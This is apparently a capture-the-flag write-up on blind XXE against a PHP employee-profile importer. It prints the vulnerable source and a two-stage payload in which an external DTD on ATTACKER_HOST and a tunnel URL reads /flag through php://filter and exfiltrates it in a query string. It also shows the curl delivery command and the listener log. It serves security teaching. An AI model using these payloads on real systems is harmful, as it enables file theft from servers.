<img width="611" height="822" alt="image" src="https://github.com/user-attachments/assets/c6898935-9fb3-467c-8382-16502e209898" />

#### Import — Blind XXE to LFI (Web)

**Category:** Web Exploitation
**Vulnerability Class:** XML External Entity (XXE) Injection → Blind/Out-of-Band File Read
**Flag:** `HNYX{Bl1nD_XmL_t0_Lf1_w1tH_0Ob_t3cHn1Qu3}`

---

#### Challenge Overview

The challenge ships a Dockerized PHP application — `CorpNet Employee Directory` — exposing a single feature: an "Employee Profile Importer" that accepts raw XML via a POST form and parses it server-side.

**Provided files:**

- `Dockerfile`
- `index.php` — landing page, links to the importer
- `import.php` — the vulnerable XML import endpoint

```docker
FROM php:7.4-apache

RUN echo "HNYX{fake_flag}" > /flag && \
    chown root:www-data /flag && \
    chmod 440 /flag

COPY index.php /var/www/html/
COPY import.php /var/www/html/
```

The flag lives at `/flag` on the container filesystem, readable by the `www-data` group — i.e. readable by the web server process itself. The goal is to get the application to read that file on our behalf and leak its contents.

---

#### Source Review

`import.php`:

```php
<?php
libxml_use_internal_errors(true);
$message = "";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['xml_data'])) {
    $xml = $_POST['xml_data'];
    $dom = new DOMDocument();

    if ($dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD)) {
        $message = "Success! The employee profile has been placed in the processing queue.";
    } else {
        $message = "Parse Error: Invalid XML syntax.";
    }
}
?>
```

Two flags passed to `loadXML()` matter:

| Flag | Effect |
| --- | --- |
| `LIBXML_NOENT` | Substitutes general entities during parsing |
| `LIBXML_DTDLOAD` | Allows the parser to fetch an **external DTD** referenced in the document, including over HTTP |

This is a textbook XXE sink: user-controlled XML is parsed with external entity/DTD resolution enabled, and no validation or whitelisting is applied to the input.

**The catch:** the application never echoes the parsed document or any node values back to the user. It only ever displays one of two static strings — `"Success!..."` or `"Parse Error..."`. Errors are also suppressed via `libxml_use_internal_errors(true)`, so no stack trace or libxml warning leaks anything either. This rules out the simplest form of XXE exploitation (in-band entity expansion, where you define `<!ENTITY xxe SYSTEM "file:///flag">` and reference `&xxe;` somewhere the app reflects back). The application is **blind** to the attacker — confirmation of success has to come from an out-of-band (OOB) channel instead.

---

#### Exploitation Strategy: Blind XXE via External DTD

Because direct entity reflection isn't available, the standard technique is a **two-stage out-of-band XXE** using parameter entities. This works regardless of `LIBXML_NOENT`, because **parameter entities inside a DTD are always expanded during DTD parsing** — that flag only governs general entity substitution in the document body.

#### Pull in an attacker-hosted external DTD

The payload sent to `import.php` does nothing but fetch a DTD we control:

```xml
<?xml version="1.0"?>
<!DOCTYPE employee [
  <!ENTITY % remote SYSTEM "https://ATTACKER_HOST/evil.dtd">
  %remote;
]>
<employee><name>x</name></employee>
```

`LIBXML_DTDLOAD` permits this fetch. The target server now makes an outbound HTTP request to infrastructure we control.

#### The external DTD reads the file and exfiltrates it

`evil.dtd`, hosted on our own listener:

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % init "<!ENTITY &#x25; exfil SYSTEM 'https://ATTACKER_HOST/leak?d=%file;'>">
%init;
%exfil;
```

What this does, step by step:

1. **`%file`** reads `/flag` through PHP's `php://filter` stream wrapper with base64 encoding. This matters because PHP's `DOMDocument` resolves `SYSTEM` identifiers through PHP's own stream wrapper layer, so `php://filter` URIs are honored. Base64-encoding the content also sidesteps any raw bytes (newlines, `&`, `<`) that would otherwise corrupt the XML/URL being built in the next step.
2. **`%init`** is a classic *entity-defining-an-entity* trick: parameter entities can't be nested directly inside another entity's replacement text at parse time, so the standard workaround is to have one entity (`%init`) declare a *new* entity (`%exfil`) whose `SYSTEM` URL embeds the already-resolved `%file` value as a query parameter. The `&#x25;` is the character reference for `%`, needed here because a literal `%` inside an entity value would be interpreted immediately rather than emitted literally.
3. **`%exfil`** fires the actual exfiltration: an outbound HTTP GET from the target server to our listener, with the base64-encoded flag riding along in the `d` query parameter.

---

#### Building the Exploit Infrastructure

Since the target container only displays "Success/Parse Error", we need our own public endpoint to (a) serve `evil.dtd` and (b) receive the exfil callback. From a NAT'd attack VM, this requires a tunnel:

<img width="1202" height="571" alt="image" src="https://github.com/user-attachments/assets/3ee34799-a988-4d19-8d24-99a6c785d30a" />

```bash
mkdir -p ~/Desktop/ctf/web/xxe && cd ~/Desktop/ctf/web/xxe
python3 -m http.server 8000          # serves evil.dtd locally
ssh -R 80:localhost:8000 nokey@localhost.run   # public HTTPS tunnel
```

<img width="787" height="225" alt="image" src="https://github.com/user-attachments/assets/2816edbb-4a05-48d5-be42-fd745336a4f7" />

This produced a public URL: `https://3dd73968732a76.lhr.life`.

`evil.dtd` (final version):

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % init "<!ENTITY &#x25; exfil SYSTEM 'https://3dd73968732a76.lhr.life/leak?d=%file;'>">
%init;
%exfil;
```

Verified reachable before touching the target:

<img width="880" height="662" alt="image" src="https://github.com/user-attachments/assets/2020e91e-fbb9-4eaa-919b-90594474176c" />

```bash
curl -v https://3dd73968732a76.lhr.life/evil.dtd
# HTTP/1.0 200 OK, content-type: application/xml-dtd — raw DTD returned correctly
```

---

#### Delivering the Payload

<img width="1507" height="510" alt="image" src="https://github.com/user-attachments/assets/b15f555e-89d1-4401-96ff-dd5f9dd023cd" />

```bash
curl -X POST 'http://c46e507d-b570-4a32-9cbc-2f184d40f73d.34.143.189.39.sslip.io:8001/import.php' \
  --data-urlencode 'xml_data=<?xml version="1.0"?><!DOCTYPE employee [<!ENTITY % remote SYSTEM "https://3dd73968732a76.lhr.life/evil.dtd">%remote;]><employee><name>x</name></employee>'
```

The application's HTTP response (predictably) just showed `Success!` along with a PHP warning, since `display_errors` happened to be on for this stack — but the actual proof of exploitation was in the listener log:

<img width="985" height="150" alt="image" src="https://github.com/user-attachments/assets/f973f1e0-59b4-40ac-9e4f-8d5a7749f1ba" />

```
127.0.0.1 - - [21/Jun/2026 09:03:08] "GET /evil.dtd HTTP/1.1" 200 -
127.0.0.1 - - [21/Jun/2026 09:03:25] "GET /evil.dtd HTTP/1.0" 200 -
127.0.0.1 - - [21/Jun/2026 09:03:27] code 404, message File not found
127.0.0.1 - - [21/Jun/2026 09:03:27] "GET /leak?d=SE5ZWHtCbDFuRF9YbUxfdDBfTGYxX3cxdEhfME9iX3QzY0huMVF1M30K HTTP/1.0" 404 -
```

Two confirming hits:

1. `GET /evil.dtd` — the target fetched our malicious DTD as instructed.
2. `GET /leak?d=...` — the target's second outbound request, carrying the base64-encoded flag. The `404` is irrelevant noise (Python's `http.server` has no `/leak` route) — the data was already captured in the request log line before the 404 was returned.

---

#### Extracting the Flag

```bash
echo 'SE5ZWHtCbDFuRF9YbUxfdDBfTGYxX3cxdEhfME9iX3QzY0huMVF1M30K' | base64 -d
```

```
HNYX{Bl1nD_XmL_t0_Lf1_w1tH_0Ob_t3cHn1Qu3}
```

flag captured!
